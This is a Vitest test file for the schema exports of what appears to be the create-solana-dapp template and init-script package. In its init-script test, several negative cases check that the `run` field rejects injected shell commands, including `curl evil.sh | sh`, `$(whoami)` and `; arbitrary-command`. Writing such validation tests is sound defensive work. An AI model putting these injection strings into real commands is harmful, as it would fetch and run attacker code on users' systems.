import { describe, expect, expectTypeOf, it } from 'vitest'
import {
  initScriptKey,
  InitScriptSchema,
  InitScriptSchemaInstructions,
  InitScriptSchemaOption,
  InitScriptSchemaOptions,
  InitScriptSchemaPackageManager,
  InitScriptSchemaRename,
  InitScriptSchemaSkills,
  InitScriptSchemaVersions,
  parseTemplateJson,
  templateJsonGroupSchema,
  templateJsonSchema,
  templateJsonTemplateSchema,
} from '../src/index'
import type {
  InitScriptInstructions,
  InitScriptOption,
  InitScriptOptions,
  InitScriptPackageManager,
  InitScriptRename,
  InitScriptSkills,
  InitScriptVersions,
} from '../src/index'
import * as initScriptSchemaModule from '../src/utils/init-script-schema'
import * as templateSchemaModule from '../src/utils/template-schema'

const templateGroup = {
  description: 'Templates for mobile apps',
  name: 'mobile',
  path: 'templates/mobile',
  templates: [
    {
      description: 'A React Native app',
      displayName: 'React Native',
      id: 'mobile-react-native',
      keywords: ['mobile', 'react-native'],
      name: 'react-native',
      path: 'templates/mobile/react-native',
    },
  ],
}

describe('package root schema exports', () => {
  it('exports the template catalog schemas', () => {
    const exportedSchemas = {
      parseTemplateJson,
      templateJsonGroupSchema,
      templateJsonSchema,
      templateJsonTemplateSchema,
    }

    expect(Object.keys(exportedSchemas)).toEqual([
      'parseTemplateJson',
      'templateJsonGroupSchema',
      'templateJsonSchema',
      'templateJsonTemplateSchema',
    ])

    // The root export must be the same instance the CLI uses, not a copy
    expect(templateJsonSchema).toBe(templateSchemaModule.templateJsonSchema)
    expect(templateJsonGroupSchema).toBe(templateSchemaModule.templateJsonGroupSchema)
    expect(templateJsonTemplateSchema).toBe(templateSchemaModule.templateJsonTemplateSchema)
    expect(parseTemplateJson).toBe(templateSchemaModule.parseTemplateJson)
  })

  it('exports the init script schemas', () => {
    const exportedSchemas = {
      InitScriptSchema,
      InitScriptSchemaInstructions,
      InitScriptSchemaOption,
      InitScriptSchemaOptions,
      InitScriptSchemaPackageManager,
      InitScriptSchemaRename,
      InitScriptSchemaSkills,
      InitScriptSchemaVersions,
    }

    expect(Object.keys(exportedSchemas)).toEqual([
      'InitScriptSchema',
      'InitScriptSchemaInstructions',
      'InitScriptSchemaOption',
      'InitScriptSchemaOptions',
      'InitScriptSchemaPackageManager',
      'InitScriptSchemaRename',
      'InitScriptSchemaSkills',
      'InitScriptSchemaVersions',
    ])

    // The root export must be the same instance the CLI uses, not a copy
    expect(InitScriptSchema).toBe(initScriptSchemaModule.InitScriptSchema)
    expect(InitScriptSchemaInstructions).toBe(initScriptSchemaModule.InitScriptSchemaInstructions)
    expect(InitScriptSchemaOption).toBe(initScriptSchemaModule.InitScriptSchemaOption)
    expect(InitScriptSchemaOptions).toBe(initScriptSchemaModule.InitScriptSchemaOptions)
    expect(InitScriptSchemaPackageManager).toBe(initScriptSchemaModule.InitScriptSchemaPackageManager)
    expect(InitScriptSchemaRename).toBe(initScriptSchemaModule.InitScriptSchemaRename)
    expect(InitScriptSchemaSkills).toBe(initScriptSchemaModule.InitScriptSchemaSkills)
    expect(InitScriptSchemaVersions).toBe(initScriptSchemaModule.InitScriptSchemaVersions)
    expect(initScriptKey).toBe(initScriptSchemaModule.initScriptKey)
  })

  it('validates a template catalog through the root exports', () => {
    expect(templateJsonSchema.safeParse([templateGroup]).success).toBe(true)
    expect(templateJsonGroupSchema.safeParse(templateGroup).success).toBe(true)
    expect(templateJsonTemplateSchema.safeParse(templateGroup.templates[0]).success).toBe(true)

    const invalid = templateJsonSchema.safeParse([{ ...templateGroup, name: 42 }])
    expect(invalid.success).toBe(false)

    expect(parseTemplateJson(JSON.stringify([templateGroup])).success).toBe(true)
    expect(parseTemplateJson('not json').success).toBe(false)
  })

  it('validates an init script through the root exports', () => {
    const initScript = {
      instructions: ['pnpm install'],
      options: {
        'mobile-wallet': {
          default: true,
          description: 'Include mobile wallet adapter',
          group: 'mobile',
          instructions: ['pnpm run android'],
          rename: { 'wallet-name': { in: ['app'], to: 'my-wallet' } },
        },
      },
      packageManager: 'pnpm',
      rename: { 'anchor-project': { in: ['anchor'], to: 'my-project' } },
      skills: ['solana-dev'],
      versions: { anchor: '0.31.1', solana: '2.1.0' },
    }

    expect(InitScriptSchema.safeParse(initScript).success).toBe(true)
    expect(InitScriptSchema.safeParse({}).success).toBe(true)
    expect(InitScriptSchema.safeParse({ packageManager: 'not-a-package-manager' }).success).toBe(false)

    expect(InitScriptSchemaInstructions.safeParse(initScript.instructions).success).toBe(true)
    expect(InitScriptSchemaOption.safeParse(initScript.options['mobile-wallet']).success).toBe(true)
    expect(InitScriptSchemaOptions.safeParse(initScript.options).success).toBe(true)
    // Option keys are constrained to lowercase kebab-case flag names
    expect(InitScriptSchemaOptions.safeParse({ 'Mobile Wallet': {} }).success).toBe(false)
    // `run` reaches a shell, so shell metacharacters are rejected rather than escaped
    expect(InitScriptSchemaOption.safeParse({ run: 'reset-project -- --yes' }).success).toBe(true)
    expect(InitScriptSchemaOption.safeParse({ run: 'configure --path=./src --tag=v1.2.3' }).success).toBe(true)
    expect(InitScriptSchemaOption.safeParse({ run: 'reset-project ; arbitrary-command' }).success).toBe(false)
    expect(InitScriptSchemaOption.safeParse({ run: 'reset-project && curl evil.sh | sh' }).success).toBe(false)
    expect(InitScriptSchemaOption.safeParse({ run: 'reset-project $(whoami)' }).success).toBe(false)
    expect(InitScriptSchemaOption.safeParse({ run: 'configure --title "My  App"' }).success).toBe(false)
    expect(InitScriptSchemaPackageManager.safeParse('npm').success).toBe(true)
    expect(InitScriptSchemaRename.safeParse(initScript.rename).success).toBe(true)
    expect(InitScriptSchemaSkills.safeParse(initScript.skills).success).toBe(true)
    expect(InitScriptSchemaVersions.safeParse(initScript.versions).success).toBe(true)

    expect(initScriptKey).toBe('create-solana-dapp')
  })

  it('exports the init script types inferred from the schemas', () => {
    expectTypeOf<InitScriptInstructions>().toEqualTypeOf<string[]>()
    expectTypeOf<InitScriptSkills>().toEqualTypeOf<string[]>()
    expectTypeOf<InitScriptPackageManager>().toEqualTypeOf<'bun' | 'npm' | 'pnpm' | 'yarn'>()
    expectTypeOf<InitScriptRename>().toEqualTypeOf<Record<string, { in?: string[]; paths?: string[]; to: string }>>()
    expectTypeOf<InitScriptOption>().toEqualTypeOf<{
      default?: boolean
      description?: string
      group?: string
      instructions?: string[]
      rename?: InitScriptRename
      run?: string
    }>()
    expectTypeOf<InitScriptOptions>().toEqualTypeOf<Record<string, InitScriptOption>>()
    expectTypeOf<InitScriptVersions>().toEqualTypeOf<{ adb?: string; anchor?: string; solana?: string }>()
  })
})
